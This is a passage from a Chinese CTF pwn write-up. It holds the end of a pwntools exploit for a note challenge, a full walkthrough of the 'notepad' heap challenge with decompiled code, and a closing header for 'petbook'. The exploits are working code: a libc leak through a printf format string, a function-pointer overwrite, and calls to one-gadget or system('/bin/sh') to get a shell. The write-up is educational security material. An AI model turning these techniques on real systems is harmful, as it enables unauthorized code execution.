    def add(contant):
        sla(p,"Your action: ","1")
        sla(p,"Input your note: ",contant)
    def edit(index,contant):
        sla(p,"Your action: ","2")
        sla(p,"Which note to edit: ",str(index))
        sla(p,"Your new data: ",contant)
    def show(index):
        sla(p,"Your action: ","3")
        ru("Which note to show: ")
        sl(str(index))
    def show_all():
        sla(p,"Your action: ","4")
    gdb.attach(p)
    pause()
    add("aa")
    show(0)
    ru("Next note: 0x")
    note = int(p.recv(8),16)
    print "next note is-->",hex(note)
    pause()
    edit(0,"a"*4+p32(note+0x4200-0x20))
    pause()
    add("b"*2)
    pause()
    edit(2,"b"*4+p32(note+0x4200-0x20+0x40+8))
    pause()
    show(4)
    ru("Next note: 0x")
    libc_main = int(p.recv(8),16)
    libc_base= libc_main-0x18637
    #这个地方有点迷，泄漏出来是实际上应该是__libc_start_main_ret
    #但libc.symbols会提示找不到符号
    #去libcdatabase查了一波，得到了0x18637的偏移
    one = libc_base+0x5fbc5#远程端:0x5faa5,本地:0x5fbc5
    print "onegadget---->",hex(one)
    print "libc_base-->",hex(libc_base)
    pause()
    edit(2,"b"*4+p32(note+0x4200-0x20+0x40))
    pause()
    add(p32(one)*2)
    sla(p,"Your action: ","5")
    getshell()
做完这题后去查了别的师傅的wp，发现他们的做法都不一样，有的是改got表的操作，有的是return2dl_resolve的操作，真是太秀了,他们的wp在网上搜一下也很容易找到
# notepad
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
常规保护机制nx+canary
这是一道堆漏洞利用的题目，题目逻辑略显复杂，但大部分都是花里胡哨的没用的逻辑，进去会先看到一个菜单，直接进入notepad进行分析，其他的都是没用的
首先看这个
    int notepad_new()
    {
      char *v1; // eax
      char *v2; // ST1C_4
      char **v3; // [esp+4h] [ebp-14h]
      signed int n; // [esp+8h] [ebp-10h]
      v3 = notepad_find_slot();
      if ( !v3 )
        return puts("space is full");
      printf("size > ");
      n = readint();
      if ( n  0x400 )
        return puts("invalid size");
      v1 = malloc(n + 16);
      v2 = v1;
      *(v1 + 3) = n;
      *(v1 + 2) = 1;
      *v1 = notepad_show;
      *(v1 + 1) = notepad_destory;
      printf("data > ");
      fgets(v2 + 16, n, stdin);
      *v3 = v2;
      return printf("your note id is %d\n", (v3 - notes) >> 2);
    }
可以看到，new函数，可以分配0x10~0x410大小的chunk，在chunk中有以下结构：
    struct note{
        notepad_show *notepad_show;//存储一个函数指针，用于输出内容chunk
        notepad_destroy *notepad_destroy;//存储一个函数指针，用于清空data
        int flags;//标记，判断是否可以open进行编辑
        int n;//data数组的大小
        data[n]//note的内容
    }
这个程序大量使用了函数指针的方式，这就有可能造成函数指针窜用的漏洞
继续看open函数：
    unsigned int notepad_open()
    {
      int v0; // ST1C_4
      int *v2; // [esp+4h] [ebp-1024h]
      int v3; // [esp+8h] [ebp-1020h]
      const char *v4; // [esp+10h] [ebp-1018h]
      const char *v5; // [esp+14h] [ebp-1014h]
      int v6; // [esp+18h] [ebp-1010h]
      char s; // [esp+1Ch] [ebp-100Ch]
      unsigned int v8; // [esp+101Ch] [ebp-Ch]
      v8 = __readgsdword(0x14u);
      v2 = notepad_choose();
      if ( v2 )
      {
        v3 = *v2;
        puts("note opened");
        if ( *(v3 + 8) && yes_or_no("edit") )
        {
          printf("content > ");
          fgets(&s, 0x1000, stdin);
          strncpy((v3 + 16), &s, *(v3 + 12));
          puts("note saved");
        }
        v4 = "show note";
        v5 = "destory note";
        v6 = 0;
        v0 = menu(&v4);//看下面menu函数的具体实现
        (*(v3 + 4 * (v0 - 1)))(v3);//这里可以造成后一个chunk非法访问前一个chunk的内容
        puts("note closed");
      }
      return __readgsdword(0x14u) ^ v8;
    }
    int __cdecl menu(int a1)
    {
      int result; // eax
      int i; // [esp+8h] [ebp-10h]
      int v3; // [esp+Ch] [ebp-Ch]
      for ( i = 0; *(4 * i + a1); ++i )
        printf("%c> %s\n", i + 97, *(4 * i + a1));
      printf("::> ");
      v3 = getchar() - 'a';//仅仅简单的相对应‘a’进行判断，如果输入比‘a’小的字符一样可以通过检验
      freeline();
      if ( v3  ")
        sl('a')
        ru("size > ")
        sl(str(size))
        ru("data > ")
        sl(content)
    def open_edit(index,content,choose = 'a'):
        ru("::> ")
        sl('b')
        ru("id > ")
        sl(str(index))
        ru("edit (Y/n)")
        sl("y")
        ru("content > ")
        sl(content)
        ru("::> ")
        sl(choose)
    def open_not_edit(index,choose = 'a'):
        ru("::> ")
        sl('b')
        ru("id > ")
        sl(str(index))
        sl("n")
        ru("::> ")
        sl(choose)
    def delete(index):
        ru("::> ")
        sl('c')
        rc()
        sl(str(index))
    def setread(index):
        ru("::> ")
        sl('d')
        rc()
        sl(str(index))
    def keepsec(index):
        ru("::> ")
        sl('e')
        rc()
        sl(str(index))
    gdb.attach(p)
    sp()
    sla(p,"::> ","c")
    new(0x60,"aaaa")#chunk0
    new(0x60,"bbbb")#chunk1
    new(0x60,"cccc" )#chunk2
    payload = "a"*0x5c + p32(elf.symbols['free'])
    open_edit(0,payload)
    open_edit(1,"bbbb",'^')#'a'-3 = 97-3='^'
    delete(0)
    print "printf------------------->",hex(elf.plt['printf'])
    payload1 = "a" * 0x5c  + p32(elf.plt['printf'])
    payload1 += "a"*8 + "%1063$p\x00"#泄露出main的返回地址
    new(0xe0 - 16,payload1)
    sp()
    open_not_edit(1,'^')
    sp()
    leak = int(p.recv(10),16)
    print "leak-------->",hex(leak)
    libc_base = leak - 0x18637#__libc_start_main_ret偏移
    print "libc_base----------->",hex(libc_base)
    system = libc_base+libc.symbols['system']
    print "system 0ffset--------->",hex(libc.symbols['system'])
    print "system --------->",hex(system)
    delete(0)
    payload2 = 'a'*0x5c + p32(system) 
    payload2 += "a"*8 + '/bin/sh\x00'
    new(0xe0 - 16,payload2)
    open_not_edit(1,'^')
    getshell()
这里需要注意的是的，通过调用printf(%1063$p)泄漏出的main函数的返回地址，从而泄漏了libc，这个1063是通过调试得来的，在执行`open_not_edit(1,'^')`之前，往printf函数下个断点，在执行printf(%1063$p)之前查看栈的情况，发现0xff952cb0是存储格式化字符串参数的地方
那么疯狂往下找main函数的返回地址，发现在0xff953d4c处可以泄漏出__libc_start_main+247
从而计算出偏移的位置是1063或者1067
另外这题用onegadget似乎不行，只能老老实实构造system(/bin/sh)
# petbook
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)